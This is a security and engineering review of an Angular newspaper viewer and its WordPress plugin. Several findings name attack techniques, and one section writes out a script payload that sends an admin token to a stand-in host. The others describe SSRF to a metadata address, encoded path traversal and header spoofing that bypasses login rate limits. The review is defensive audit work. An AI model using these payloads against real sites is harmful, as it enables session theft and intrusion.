# Digital Newspaper — Codebase Review

**Reviewed:** 15 Aug 2026 · branch `development` (clean tree, HEAD `7ad31c4c`)
**Scope:** Angular 21 SPA (`src/`, ~27,200 lines) + WordPress plugin (`wordpress-plugin/digital-newspaper/digital-newspaper.php`, 8,532 lines) + build/deploy tooling
**Method:** full read of the plugin and all services/interceptors/config; structural read + hot-spot sampling of the four >90 KB files; live verification of build/deploy/git claims on the dev machine. Every finding below was re-checked by an independent adversarial pass — claims that did not survive verification are marked or removed.

**Companion document:** SEO and performance are audited at implementation depth in **[`SEO_PERFORMANCE.md`](./SEO_PERFORMANCE.md)** — critical rendering path, LCP chain, CLS inventory, INP hot spots, `.htaccess`/service-worker cache policy, and an exact per-item SEO spec. Chapters 6 and 7 below are the summary; that document is the detail.

**No code was changed.** This is analysis only.

---

## 0. Executive summary

This is an unusually well-engineered *page-image viewer*. The caching architecture, image-delivery front end, optimistic concurrency, page locking, activity auditing, bulk ingest and comment quality are all above the norm for the genre. Several things commonly recommended in reviews are already done correctly here (full TS strict mode + `strictTemplates`, modern `@if`/`@for` with `track` everywhere, standalone components, immutable store updates, `$wpdb->prepare()` on every query, timing-safe JWT comparison, content-sniffed upload validation, SSR platform guards).

The problems cluster in six places:

| Area | Verdict |
|---|---|
| **Security (plugin)** | One confirmed **critical** stored-XSS → admin-token-theft chain, plus 5 confirmed high/medium issues. Authorization is only two tiers and the lower tier (`edit_posts` = Contributor) can do destructive things. |
| **Build & deploy** | **Every automated build path is broken** and has been since early July. Production FTP credentials are committed in 5 tracked files. SSR is fully configured and never runs; the deploy scripts don't understand the `browser/`/`server/` output split. |
| **SEO** | **Googlebot sees an empty shell on every URL, and the crawl graph is a single node** — no link exists from anywhere to any date, page or article. ~128,000 article URLs are undiscoverable. No description, canonical, JSON-LD, sitemap, robots.txt; `<html lang="en">` on Bengali content. See ch. 6. |
| **Performance** | The LCP image is **4–6 round trips deep** on a cold load, and the code that fixes it is written, shipped, and **disabled by four `false` defaults**. The LCP image is also explicitly deprioritized in favour of a blurred placeholder, and every reader's service worker prefetches the admin bundle. See ch. 7. |
| **Product features** | No search, no PDF, no analytics instrumentation, no push/newsletter, no reader accounts. The app treats the paper as pictures, not as a content corpus. |
| **Maintainability** | 4,413-line component, 2,527-line service, 8,532-line PHP file. **Zero tests, zero lint, zero formatter, no CI gate.** |

**Do these seven first, in order:**

1. Sanitize/gate `headScripts` (§1.1) — this is a live critical.
2. Rotate the FTP password and strip it from the repo (§2.2).
3. Fix the `npm run build -- --flag` bug (§2.1) — one line, unblocks CI and `npm run deploy`.
4. Add `current_user_can('delete_post')` to media delete (§1.2).
5. Add `.html` to the compression path, then **turn on the four plugin flags** (§7.2) — cold load goes 6 round trips → 2.
6. Add search crawlers to the prerender UA list and ship sitemaps (§6.1, §6.3) — nothing else in SEO matters until Google can see and discover the content.
7. Add ESLint + Prettier + a pre-commit hook (§5.1) — the cheapest permanent quality floor.

---

## 1. Security — WordPress plugin

### 1.1 CRITICAL — Stored XSS → admin JWT theft, exploitable by any Contributor

**Chain (all four links verified):**

| Step | Evidence |
|---|---|
| `PATCH /data/settings` requires only `auth_required` | `digital-newspaper.php:2930-2937` → `auth_required` at `:7690` ends with `user_can($user, 'edit_posts')` — **Contributor and up** |
| `headScripts` is in the allow-list and values are never sanitized | `:4629` `'headScripts', 'othersPageTitle',`; `:4634` `array_intersect_key(...)` filters **keys only**, values stored verbatim |
| The value is served publicly and executed for anonymous readers | `GET /data/settings` is `__return_true` (`:2929`); `app.component.ts:63-65` → `injectHeadScripts()`; `:136` `container.innerHTML = html;` then `:138-148` **re-creates `<script>` nodes and appends them to `<head>`** — deliberately defeating the normal innerHTML script protection |
| The admin token is readable by that script | `auth.service.ts:38,75` — JWT in `localStorage['dn_wp_token']`, 24 h TTL, no server-side revocation |

**Aggravating:** the CSP is emitted as `Content-Security-Policy-Report-Only` (`:805`), so `script-src 'self'` blocks nothing. `helmet` is a dependency (`package.json:36`) but is never called in `server.ts`.

**Exploit:** a Contributor logs in via `POST /auth/login`, PATCHes `headScripts` to `<script>fetch('//evil/?t='+localStorage.dn_wp_token)</script>`, and harvests the administrator's JWT the next time an admin loads any page — then owns every `admin_required` endpoint including `/data/restore`. The same payload also reaches every public reader.

**Fix direction:** require `unfiltered_html` (or `manage_options`) for `headScripts` specifically; `wp_kses_post()` every other settings string value; move the CSP off report-only once you know it passes.

### 1.2 HIGH — Any Contributor can delete every attachment on the site

`:3121-3128` registers `DELETE /media/(?P<id>\d+)` with `auth_required`. The handler at `:7671-7682` is:

```php
$id = (int) $request->get_param('id');
$result = wp_delete_attachment($id, true);   // force = skip trash
```

No `current_user_can('delete_post', $id)`, no author check, no post-type check — and `wp_delete_attachment()` performs no capability check of its own. A loop over `/media/1..N` permanently removes every newspaper page scan from disk. `upload_media` (`:7552`) likewise requires only `edit_posts` where WordPress core requires `upload_files`.

### 1.3 HIGH — Login brute-force limiter is bypassable

`:7349`:
```php
$client_ip = sanitize_text_field((string)($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? ''));
$rate_key  = 'dn_login_attempts_' . md5($client_ip);
```

`X-Forwarded-For` is trusted with no trusted-proxy allowlist, and here the *entire* header is the key — one extra character per attempt gives an unlimited fresh 5-attempt bucket. The 5-attempt lockout provides zero protection, and every forged value creates a `wp_options` transient row for 10 minutes.

Same trust at `:816-818` for public-GET limiting; there the comment ("Only use the first IP … to prevent spoofing") is backwards — leftmost is the fully attacker-supplied element.

### 1.4 HIGH — `/section-crop` is unauthenticated, unmetered, and writes a file per request

`:3099-3105` — `permission_callback => '__return_true'`. The handler (`:4232`) calls `add_public_security_headers()` but **not** `check_public_get_rate_limit()` (that helper appears only at `:4551`, `:4696`, `:4741`). Cache key is `md5(url|x|y|w|h)` (`:4297`), so every unique float tuple misses cache and `:4342` `imagejpeg($crop, $path, 90)` writes a new JPEG into uploads. Nothing prunes them.

A loop over crop coordinates fills the disk and pins CPU (each request decodes a full page scan into GD). The CPU half is arguably worse than the disk half.

### 1.5 MEDIUM — `?force=1` lock release has no capability check

`:8433-8440`:
```php
$force = $request->get_param('force') === '1';
// Only the lock holder (or an admin using ?force=1) may release.   ← the admin check does not exist
if ($existing && is_array($existing)) {
  if (!$force && (int) $existing['userId'] !== $user->ID) { return 403; }
}
```
Route permission is `auth_required`, so any editor can steal another editor's page lock and overwrite in-progress work. Editorial impact, not privilege escalation.

### 1.6 MEDIUM — Section article HTML stored unfiltered; print path bypasses Angular's sanitizer

Storage: `:7192` `$s = $section;` assigns raw decoded JSON. `validate_section_payload` (`:6811-6815`) checks `is_string` and `strlen <= 512000` only. (The WP-post *mirror* at `:2792` does apply `wp_kses_post` — but the `dn_edition_*` copy the app actually reads does not.)

Sink: `newspaper.component.ts:1528` `articleEl.innerHTML = this.normalizeContent(content)` into a same-origin `window.open('','_blank')` document; `normalizeContent` (`:1544-1549`) only replaces `&nbsp;`.

**Scoped honestly:** inline `<script>` inserted via `innerHTML` does not execute, so this fires only via event handlers (`<img onerror=…>`) *and* requires the victim to click Print. Materially weaker than §1.1.

**Not verifiable from the reviewed tree:** `src/app/shared/pipes/normalize-content.pipe.ts` was not among the staged files. If the on-screen article modal renders via `[innerHTML]`, Angular's sanitizer covers it; if it uses `bypassSecurityTrustHtml`, this becomes a much more serious finding. **Please check that one file.**

### 1.7 MEDIUM — SSRF via editor-controlled image URLs

`:4083` and `:4150` call `wp_remote_get($logoUrl / $imageUrl)`. Neither `patch_settings_endpoint` (`:4635`) nor `validate_section_payload` (`:6820-6826`) validates scheme or host. `GET /social-thumb` and `GET /social` are both `__return_true`, so an editor-set `logo.url = http://169.254.169.254/...` turns into a blind server-side request from any anonymous visitor.

### 1.8 MEDIUM — Fatal-error log written into a web-served directory

`:6888-6893` `@file_put_contents(WP_CONTENT_DIR . '/dn-last-fatal.log', ...)` with a payload containing the error message, absolute file path, line, endpoint and peak memory (`:6867-6877`). The plugin writes `.htaccess` rules in three places but none denies `*.log` under `wp-content/`. The path is fixed and guessable. (The REST/`?dn_diag=` reader *is* properly gated at `:5779`.)

Related: 500 response bodies return `$e->getMessage()`, `basename($e->getFile())` and `$e->getLine()` to any authenticated editor (`:5531`, `:6441-6443`, `:7029-7035`).

### 1.9 MEDIUM — Path-traversal primitive in `/social-thumb` (real, but not anonymously reachable)

`:3923-3924`:
```php
$filename  = basename((string) parse_url($imageUrl, PHP_URL_PATH));
$localPath = rtrim($upload['basedir'], '/') . '/' . rawurldecode($filename);
```
`basename()` runs on the still-encoded path, so `%2e%2e%2f` survives it and `rawurldecode` then produces `../`. `readfile()` at `:3936` with **no `realpath()` containment** — unlike `proxy_image`, which does it correctly at `:7462-7464`.

**Verification downgraded this from the original "unauthenticated arbitrary file read":** `$imageUrl` is never taken from request params; it comes from stored section data or `settings.logo.url`. The section path is gated by `dn_social_image_is_valid()` (`:4428-4451`, `getimagesize()` + size/dimension checks), so arbitrary non-image reads require the unvalidated `$imageUrl = $logoUrl` branch at `:3916`, which is reached only when GD is unavailable. Still worth fixing — it is one `realpath()` check and the sibling endpoint already has it.

### 1.10 LOW — Other items

- **`.htaccess` disables the host WAF site-wide.** `:212-215` writes an unscoped `<IfModule mod_security.c> SecFilterEngine Off` block into the *root* `.htaccess` on `admin_init`, with no opt-in. On any mod_security v1 host this removes POST inspection for the whole WordPress install, not just this plugin's routes.
- **Hardcoded fallback JWT secret** `'dn_fallback_secret'` at `:7977`. Verification: guarded by `defined('AUTH_KEY') && AUTH_KEY`, and every installer-generated `wp-config.php` defines a truthy `AUTH_KEY` — so this is effectively dead code on a standard install. Still worth replacing with a hard failure rather than a fallback.
- **Session TTL mismatch, no revocation.** `TOKEN_TTL = 86400` (`:19`) but `wp_set_auth_cookie($user->ID, true)` (`:7396`) sets a 14-day cookie; the comment claims they match. `auth.service.ts:97-98` logout only clears localStorage. No token blacklist, no invalidation on password change.
- **Dev origins hardcoded into the production CORS allowlist.** `:7823-7827` always merges `http://localhost:4200` / `127.0.0.1:4200`, with `Allow-Credentials` defaulting to true. (The rest of the CORS implementation is correct — exact-match allowlist, `header_remove()` of core's wildcard, `Vary: Origin`.)
- **Advisory-only locking on atomic endpoints.** `:6659-6665` — no lock means permitted. `put_page_endpoint` / `put_section_endpoint` / the delete endpoints have no `dataVersion` guard (only `post_data_endpoint_inner` does, `:6512-6557`), so two editors who never acquire a lock get last-write-wins.
- `_doing_it_wrong` notice on every unfiltered activity-log page load (`:8182-8185` — `prepare()` called with zero placeholders). Not injectable, just noise.
- Byte-wise `substr($display_name, 0, 255)` (`:8065-8072`) will corrupt Bengali names mid-codepoint. Use `mb_substr`.
- `find_edition_ref()` (`:6683`) is dead code. Backup trim at `:2597` pops one entry regardless of overflow.
- Pervasive `@` error suppression on filesystem ops (12 sites).

### What the plugin already gets right — don't re-do these

ABSPATH guard · `$wpdb->prepare()` on **every** user-input query, `esc_like()` on both LIKE patterns, whitelisted `ORDER BY` · `unserialize(..., ['allowed_classes' => false])` · no `eval`/`extract`/dynamic callables, and no XML parsing in PHP at all (so no XXE) · bearer-token-only writes (structurally CSRF-immune) with `check_admin_referer` + capability on the one admin form · `hash_equals()` timing-safe JWT compare, `exp` enforced, `iss` pinned to the site URL · content-sniffed upload MIME with an extension allowlist that ignores the client `Content-Type`, 10 MB cap, orphan cleanup · `/proxy` and `/social-image` both correctly hardened (scheme allowlist + `realpath()` containment + content-type assertion) · three independent save guards (empty-overwrite, version conflict, shrinking-overwrite) all returning 409 with a typed reason · atomic temp-file + `rename()` snapshot writes · `autoload = false` on every large option · IP-anonymized activity logging on all privileged mutations.

---

## 2. Build, deploy and release engineering

### 2.1 CRITICAL — Every automated build path has been broken since early July

`package.json`: `"build": "ng build && node scripts/compress-dist.js"`

npm appends `--` arguments to the **end of the whole shell string**, so `npm run build -- --configuration=production` expands to `ng build && node scripts/compress-dist.js --configuration=production`. `compress-dist.js:50` reads `process.argv[2]` as a target directory. Verified by running it:

```
$ node scripts/compress-dist.js --configuration=production
[compress-dist] Target directory not found: .../--configuration=production
EXIT CODE: 1
```

Broken paths — **all three**:

| Path | Line | Result |
|---|---|---|
| `npm run deploy` | `deploy.js:129` `execSync('npm run build -- --configuration=production')` | throws → `fail('Build failed…')`, deploy aborts |
| GitHub Actions | `.github/workflows/deploy.yml:31` | step exits 1 → pipeline fails on every push to `development` |
| `auto-deploy.sh` | `:56`, under `set -euo pipefail` | aborts |

Two aggravating details: `ng build` receives **zero** arguments, so `--base-href /` is silently never applied; and the whole flag was always redundant because `angular.json:111` sets `defaultConfiguration: "production"`. Independently, `auto-deploy.sh:59` does `find dist -name index.html`, which now matches nothing (see §2.3) and would fail even after the flag fix.

**Fix:** make it a first-class script — `"build:prod": "ng build --configuration production --base-href / && node scripts/compress-dist.js"` — and point `deploy.js`, CI and `auto-deploy.sh` at it.

### 2.2 CRITICAL — Production FTP credentials are committed

`deploy.js` is tracked, and lines **44-46** contain literal `host` (raw IPv4), `user` and an 11-character mixed-case password. The design defeats the `.gitignore` entry: lines 41-54 **auto-generate** `deploy.config.local.js` from a template literal containing those literals, so ignoring the generated file is cosmetic.

The same password string appears in **five tracked files**: `deploy.js`, `deploy.config.js`, `monitor-env.sh`, `TROUBLESHOOTING.md`, `SITE_DOWNTIME_DEBUG.md` — and `git log -S` traces it back through at least five commits.

**Treat as compromised.** Rotate the Hostinger password, remove every literal (fail fast on missing env instead of auto-generating), and plan a history rewrite or accept that the old credential is permanently public if the repo is ever shared.

### 2.3 HIGH — SSR is fully configured, never runs, and breaks the deploy layout

Configured: `provideClientHydration()` (`app.config.ts:74`), `src/server.ts` (Express + CommonEngine, with a genuinely good 8 s timeout racing a pre-read CSR shell), `app.config.server.ts` with `RenderMode.Server` for `**`.

Reality (verified against the on-disk build):
```
$ ls dist/digital-newspaper/          → browser/  server/  prerendered-routes.json  3rdpartylicenses.txt
$ find dist -name index.html | wc -l  → 0          (only browser/index.csr.html exists)
$ cat prerendered-routes.json         → { "routes": {} }
```
The target is Hostinger shared hosting over FTP/rsync. No Node process runs `server.ts`.

Consequences:
- `deploy.js:136,153,412` copies `dist/digital-newspaper` **wholesale** to the web root, so `browser/` and `server/` land as subdirectories on the remote. `grep -n browser deploy.js` returns only comments — the split is entirely unhandled. The GH workflow rsyncs identically, and ships the ~3 MB Node server bundle into a public static docroot.
- The `.htaccess` `deploy.js` writes ends with `RewriteRule ^ /index.html [L]` (`:204`) — a file that does not exist. The *correct* newer `.htaccess` lives in `src/.htaccess` (uses `index.csr.html`) and gets overwritten by the hardcoded copy.
- `deploy.js:386`'s chmod loop over `['index.csr.html','index.html']` at the remote root is dead code for the same reason.
- Every URL — including `/` — serves an empty `<app-root>`. Crawlers that don't execute JS see nothing. (The `.htaccess` UA-sniff that redirects `facebookexternalhit|Twitterbot|WhatsApp` to the WordPress `/social` endpoint is a clever partial mitigation, but it only covers social scrapers.)
- ~6 production deps (`express`, `cors`, `helmet`, `compression`, `express-rate-limit`, `@types/express`) exist for a server that never boots. Four of them aren't imported anywhere.

**Decide one way:** either delete the SSR entry points, `angular.json` SSR keys and those deps — smaller, honest builds — or prerender `/` from the static snapshot you already generate (`wp-content/dn-static/initial-state.json` + the `dn-initial-state` inline tag is 90% of the work).

### 2.4 Repo hygiene, quantified

| Item | Measurement |
|---|---|
| Markdown planning docs in repo root | **36 files, 488 KB** — 4 overlapping `PERFORMANCE_*.md`, 3 overlapping `DEPLOY*.md` |
| `dist.bak/` tracked in git | **54 files, 9.1 MB** (`.gitignore` has `dist/`, which doesn't match `dist.bak/`) |
| Plugin `.zip` snapshots as version control | **5 tracked**, 372 KB |
| `src/assets/cropped/` | **33 JPEGs, 7.3 MB**, all tracked, **zero runtime references** — the two `startsWith('assets/cropped/')` hits in `admin.component.ts:1691,2344` are classification checks on runtime URLs, not loads. Copied verbatim into every build via the `src/assets/**/*` glob. (They are `installMode: lazy` in `ngsw.json`, not prefetched — so the cost is repo + deploy weight, not forced SW downloads.) |
| `.git` size | **156 MB** for 253 tracked files — the same 7.3 MB of JPEGs is committed twice (once in `src/assets`, once inside `dist.bak/`) |
| Dead config | `proxy.conf.js` **and** `proxy.conf.json` — neither is referenced; `angular.json`'s serve target has no `proxyConfig` at all |
| Duplicate deploy implementations | `deploy.js` (646 lines), `deploy-old.js`, `auto-deploy.sh` |
| Tracked binaries | 2 `.docx` reports |
| Branches | 19 local + 15 remote, including a typo'd `remote=api-caching` |

`.gitignore` is otherwise correct (`dist/`, `.angular/`, `.env*`, `*.log`, `.DS_Store` all covered; zero `.DS_Store` tracked).

---

## 3. Missing product features

Every absence below was verified by grepping both the Angular tree and the plugin PHP. Ranked by leverage.

### Tier 1 — the gaps that most limit the product

1. **No search of any kind.** `fullText|searchIndex|searchQuery|MATCH…AGAINST|fulltext` → zero hits in `src/` and zero in 8,532 lines of PHP. The 32 REST routes include no search route, and there is no reader-facing search UI. **The archive is reachable only by knowing a date.** For a paper with a growing daily archive this is the single biggest limitation.
2. **No PDF, page or edition.** `pdf|PDF|FPDF|TCPDF` → 0 hits anywhere. Downloads are raster images only (`newspaper.component.ts:1652`). Full-edition PDF is table stakes for e-papers.
3. **No SEO surface at all** — no structured data, canonical, description, sitemap, robots.txt or RSS, and no crawlable link between any two pages. **This is now chapter 6**, because the diagnosis turned out to be considerably worse than "some tags are missing."
4. **Zero analytics instrumentation.** `gtag|dataLayer|matomo` appear only inside a placeholder string in the admin textarea. The app fires no events — no page_view, no article_open, no share, no date_change. The only mechanism is pasting raw tags into `headScripts` (which is also §1.1). Relatedly, `web-vitals.service.ts:42` documents a beacon endpoint `/digital-newspaper/v1/rum` that **does not exist in the plugin** (`grep -c rum` → 0), so those beacons would 404.
5. **No way to bring readers back.** No push notifications (`PushManager|webpush|VAPID|firebase` → 0), no email/newsletter (`wp_mail` → 0 — the plugin sends no email at all), no reader accounts.

### Tier 2 — reader experience

- **PWA is not installable.** `manifest.webmanifest` sets `"display": "browser"`, which alone suppresses `beforeinstallprompt`, despite 8 correct icons, a working service worker and an update banner all being in place. Also missing `id`, `screenshots`, `shortcuts`, `scope`, `orientation`. All 8 icons declare `purpose: "maskable any"` — a maskable icon reused as `any` renders padded in the tab strip; add a separate `any` entry. **One-field fix, high visibility.**
- **No zoom or pan on the page image.** The `.zoom-indicator` magnifier at `newspaper.component.html:840,884` only opens the full-size modal. No pinch, no wheel, no drag. The only real zoom in the repo is the admin cropper. On a phone, reading a broadsheet page without zoom is the core UX problem.
- **No Web Share API** (`navigator.share` → 0). Mobile readers get desktop-style popup windows per network.
- **No keyboard navigation in the reader** — no ←/→ page turn, no Esc-to-close. (The admin cropper has a full shortcut set, so the pattern exists.)
- No dark mode, no font-size control, no `prefers-reduced-motion` handling.
- No bookmarks / save-for-later, no user clipping (readers can only share the fixed rectangles an editor drew), no TTS, no comments.
- No reader-facing language switch — language is a single global admin setting, and `Language` is a closed `'en' | 'bn'` union compiled into TS consts, so a third locale needs a code change.
- Archive UI is a flat `<select>` of dates; no month calendar with availability indicators.
- **No 404 or error page.** `{ path: '**', redirectTo: '' }` silently lands every bad URL on today's front page. A data-load failure produces one toast and then the generic "No Content Available" empty state — indistinguishable from "no edition published", with no retry button (`newspaper.component.ts:422-429`).

### Tier 3 — editorial / platform

- **No draft/published workflow, no scheduled publishing, no embargo.** `upsert_section_post()` hard-codes `post_status => 'publish'`; there is **no WP-Cron usage at all** (`wp_schedule_event` → 0). Editions go live the instant they're saved.
- **Everything is synchronous.** With no cron, backup compression of a 30-50 MB blob, full snapshot regeneration and section-post sync all happen inline in the editor's save request. That is the root cause of the memory-defensive code that dominates the PHP file.
- **No page/article versioning or diff.** The `dn_section` CPT declares `'revisions'` support (`:847`) but the plugin never reads or writes one — cost without benefit. The activity log records *that* a section was saved, never *what changed*. Rollback granularity is the whole-dataset backup.
- **Only two permission tiers** (`edit_posts` / `manage_options`). No editor/contributor/reviewer roles, no per-date or per-page ownership. This is what makes §1.1 and §1.2 severe.
- **No taxonomy, no bylines, no keywords** on sections → no topic browsing, no automatic related articles (cross-linking is manual via `linkedSectionIds`).
- No multi-tenant / multi-publication support (option keys are unprefixed globals; domain aliases are hardcoded to dailysangram.com). No city/regional editions — numeric editions with free-text labels are the only workaround.
- No CDN or object-storage offload; everything serves from local `wp-content/uploads`.
- No ad impression/click tracking or revenue reporting beyond what GAM's console gives you.
- No webhooks or `do_action()` calls at all — the plugin exposes 2 filters and 0 actions, so it isn't extensible by companion plugins.
- **Hard-coded publisher imprint in the print output.** `newspaper.component.ts:1644,1648` writes a fixed Bengali editor line and publisher/PABX block instead of reading `settings.editor`/`settings.address` (which the on-screen footer *does* use). Any other deployment prints Daily Sangram's imprint.

---

## 4. Technical improvements — Angular front end

### 4.1 The responsive image pipeline is dead code — biggest available perf win

The client side is textbook: `<picture>` with AVIF + WebP `srcset` + `sizes`, `decoding="async"`, `fetchpriority`, intrinsic `width`/`height` for CLS, blur-up LQIP, retry→placeholder fallback (`newspaper.component.html:649-670`, `.ts:894-960`).

But **nothing ever populates `imageVariants.avif` / `.webp`.** Verified exhaustively: the plugin's only `imageVariants` writer is `dn_attach_page_dimensions()` (`:4831-4867`), which sets **only** `width` and `height` — its own docblock says "No image files are ever created or modified." `avif` appears exactly once in 8,532 lines, inside an `.htaccess` string. `srcset|make_variants|generate_variant` → 0 hits.

So `mainAvifSrcset`/`mainWebpSrcset` are always `''`, both `<source>` elements render empty, and **every device downloads the single full-size page image**. Generating 2-3 widths (800/1200/1600) in AVIF+WebP at upload time via `wp_get_image_editor` (Imagick is already used in the social path) would light up the existing front end with **zero client changes**. This is the highest-leverage perf item in the codebase.

### 4.2 `AdminComponent` is a 4,413-line god object

228 methods, ~125 fields, driving a 2,646-line template. Longest: `saveSection` 177 lines (`:1698`), `savePage` 127 (`:1467`), `generateAndUploadCroppedImageFromFullSize` 125 (`:2441`), `persistAllData` 101 (`:3138`).

The file already self-segregates by comment banner — each block is a clean extraction:

| Seam | Lines | ~Size | Target |
|---|---|---|---|
| Image cropper | `:1932-3110` | 1,180 | `<app-image-cropper>` (presentational; only touches `sectionForm`) |
| Media upload | `:2695-3028` | 330 | `MediaUploadService` (pure logic — and removes the `wafBypassFetch` duplication, §4.7) |
| Activity log | `:821-988` | 170 | `<app-activity-log>` |
| Export/import/backup | `:3294-3556` | 260 | `<app-backup-panel>` |
| Locking | `:679-820` | 140 | fold into `LockService`, which already owns the HTTP half |
| Ad manager + settings form | `:4126-4324` | 200 | two more panels |

Post-split the shell is ~600-800 lines. `NewspaperDataService` (2,527 lines, 88 methods, 21 interfaces) is second: extract `DataExportImportService` from the already-contiguous `:2201-2527`.

### 4.3 Admin change detection: Default CD with 65 unguarded `detectChanges()`

`admin.component.ts:22-35` specifies `ViewEncapsulation.None` but **no `changeDetection`** → Default (`CheckAlways`) across a 2,646-line template. `detectChanges()` = 65, `markForCheck()` = 0.

Several are in promise callbacks with no destroyed-view guard, e.g. `:2609` `.finally(() => { …; this.cdr.detectChanges(); })`. `NewspaperComponent` solved this with a `_viewDestroyed` flag (`:163`, checked at `:986,1000,1031`); `AdminComponent` has zero occurrences. Navigating away from `/admin` mid-upload throws `ViewDestroyedError`.

### 4.4 Two template getters that run auth crypto on every CD tick

```ts
// admin.component.ts:514,518
get isAuthenticated(): boolean { return this.authService.isAuthenticated(); }
get isAdmin(): boolean { return this.authService.isAdmin(); }
```

`isAuthenticated()` (`auth.service.ts:131`) does `localStorage.getItem` → `split('.')` → `atob()` → `JSON.parse()`, plus a second `getStoredUser()` with another read + parse. `isAdmin()` calls it *and* `getUserRole()` — a third read.

The template references `isAdmin` 12× and `isAuthenticated` 7×. In a Default-CD component that's roughly **30 localStorage reads, 19 `atob()` decodes and 30 `JSON.parse()` calls per change-detection cycle** — i.e. per keystroke in the Quill editor. Cache into plain fields on login/logout/verify, or expose a signal.

Two more hot spots:
- `admin.component.html:584` `@for (opt of pageIdOptions; track opt)` — the getter (`:3959`) allocates 30 **new object identities** every tick and `track opt` tracks by identity, so Angular destroys and recreates all 30 `<option>` elements continuously inside an `[(ngModel)]` select. `track opt.id` + memoise.
- `sortedPages` (`:997`) returns `[...pages].sort(...)` on every tick; `getCropStyle()` is called 14× per cycle during crop-drag mousemove storms.

Overall: 91 function invocations inside bindings in `admin.component.html`.

### 4.5 No global `ErrorHandler`; 42 of 71 `subscribe()` calls have no error callback

Zero `ErrorHandler` matches in the tree. The consequential ones are the post-mutation reloads in `AdminComponent` — `:1537`, `:1549`, `:1615`, `:1847`, `:1901`, `:2385`, `:406`, `:661` — where a failed `reloadDate()` leaves the editor showing stale data with **no user-visible signal**.

52 console statements are the only error channel. 9 blocking `confirm()` + 2 `alert()` in admin freeze the thread and are unstyleable/untestable.

### 4.6 RxJS: no `takeUntilDestroyed`, 14 nested subscribes, no `shareReplay`, no `async` pipe

- `DestroyRef` is never imported. Teardown is manual `Subscription[]` arrays and two `destroy$` Subjects. `takeUntil` appears in 3 places; **41 of the 43 `subscribe()` calls in `admin.component.ts` have no teardown at all**, relying on HTTP one-shots completing.
- **14 nested subscribes.** Each is a `switchMap` waiting to happen, and the inner subscription escapes the outer's `takeUntil` — `:661` outlives `destroy$`.
- **Zero `shareReplay`/`share`.** `loadData()` and `hydrateDateIfMissing()` are cold; concurrent callers each fire a request (mitigated in practice by the HTTP cache interceptor, not by RxJS).
- **Zero `| async`** across both large templates — everything is imperative subscribe → assign → `detectChanges()`.

### 4.7 State: `AdminComponent` never subscribes to the store

`NewspaperDataService` mutations are **correctly immutable** (every mutator spreads at edition/page/section level — this part is genuinely good). But `grep data$ admin.component.ts` → **zero hits**. Instead there are **10 manual re-read sites** (`:396,1031,1037,1272,1317,1513,1606,1817,1890,2376`) each doing `this.pages = edition.pages`, capturing a snapshot reference that any `dataSubject.next()` invalidates.

The code knows this — `applyEditionFromMemory()` (`:1024`) is documented as "the single authoritative place that fixes the stale-reference issue for ALL callers" — but `savePage`, `deletePage`, `saveSection`, `deleteSection` and `deleteFromCropper` all re-assign inline and bypass it. One subscription to `data$`, or migrating `pages`/`selectedPage` to `computed()` over the existing signal, collapses all ten.

Separately, `NewspaperDataService` and `SettingsService` share the localStorage key `'dn_global_settings'` with dual write paths — documented as transitional, but it is two writers on one slot.

**Real duplication:** WAF-bypass URL rewriting exists byte-identically in `wp-api.interceptor.ts:73-93` and `admin.component.ts:2715-2730` (`wafBypassFetch`), because the upload path uses raw `fetch()` instead of `HttpClient`. A change to one will silently diverge.

### 4.8 Accessibility — poor in admin, weak in the viewer

Good: 122 real `<button>` elements in admin, `aria-hidden` on decorative SVGs, `[attr.aria-expanded]` on menu toggles, `role="button" tabindex="0" (keydown.enter)` on the vintage cards, all real `<img>` elements have `alt`.

Bad:
- **24 modal containers in `admin.component.html`, exactly one with dialog semantics** (the conflict modal, `:2585`). The cropper, export, import, new-date and edition-label dialogs are bare `<div class="modal-overlay">` — no `role="dialog"`, no `aria-modal`, no accessible name.
- **`.focus()` appears nowhere in any `.ts` or `.html` file.** No focus trap, no focus-on-open, no focus-restore. Keyboard users tab straight out of every modal into the page behind it.
- **Escape closes 2 of ~26 modals.**
- **16 non-semantic clickables** (`<div>`/`<span>` with `(click)`, no role/tabindex) — including `newspaper.component.html:815,866`, the *primary article-image affordances*, completely unreachable by keyboard.
- Only 6 `aria-*` and 1 `role=` in the entire 977-line public viewer — the surface with actual legal exposure.

### 4.9 Routing, SSR guards, typing

- **`/admin` has no `canMatch`/`canActivate`** (`app.config.ts:27-31`); zero guard/resolver matches in the whole tree. Verified **not a security issue** — the real boundary is the server-enforced `auth_required` — but a `canMatch` guard would stop the ~900 KB admin chunk downloading and the component constructing for anonymous visitors, and would let you delete the `AuthAwarePreloadingStrategy` workaround.
- **SSR platform guards are done well** — `isPlatformBrowser` / `typeof x === 'undefined'` on every storage, `window`, `IntersectionObserver` and `indexedDB` touch; `DOCUMENT` injected rather than the global. **Zero unguarded browser APIs on the SSR-reachable path.**
- **Typing is strong.** Full strict mode + `strictTemplates` + `noPropertyAccessFromIndexSignature`. Across 27k lines: 30 `: any`, 5 `as any`, 11 non-null `!`, and 30 of 34 HTTP calls carry a response generic. The `any` concentration is exactly where it hurts most though — the entire import-validation pipeline (`newspaper-data.service.ts:2347,2374,2381,2399,2475`), i.e. the path handling untrusted uploaded files.
- The XML/XLSX import sanitizer is a **deny-list** (`xml-import.service.ts:15`): `script,iframe,style,object,embed,form,input,button`. `svg`, `math`, `base`, `link`, `meta`, `template` all pass. The URL check (`:617`) only catches a literal lowercase `javascript:` after `trim()`. Replace with an allow-list or `DomSanitizer.sanitize(SecurityContext.HTML, …)`.
- Quill has no `formats` allow-list (`admin.component.ts:249-260`), so it accepts every registered format on paste.

### 4.10 Bundles, PWA, caching

Measured from the on-disk build:

| Chunk | Raw | Brotli | Load |
|---|---|---|---|
| initial total | ~596 KB | **~144 KB** | vs 750 KB warn / 1 MB error |
| `chunk-GDV5J4TR.js` (XLSX/SheetJS) | 717 KB | 164 KB | lazy ✓ |
| `chunk-5HGGXWUV.js` (Quill/parchment) | 205 KB | 52 KB | lazy ✓ |

**`xlsx` and `quill` are correctly lazy-loaded** — confirmed by grepping the built bundles; `index.csr.html` references neither. Initial transfer is healthy.

Gaps:
- The `initial` budget is the **only** budget. The ~900 KB / 216 KB-brotli admin payload is unbudgeted. Add `{"type":"bundle","name":"admin",…}` and `{"type":"allScript",…}`.
- `optimization.fonts: false` is **correct here** (fonts are self-hosted via `@fontsource-variable`, so there's nothing external to inline) — worth a one-line comment in `angular.json` so nobody "fixes" it.
- `ngsw-config.json` still lists `/index.html` in `app-shell.files` — silently dropped, but misleading.
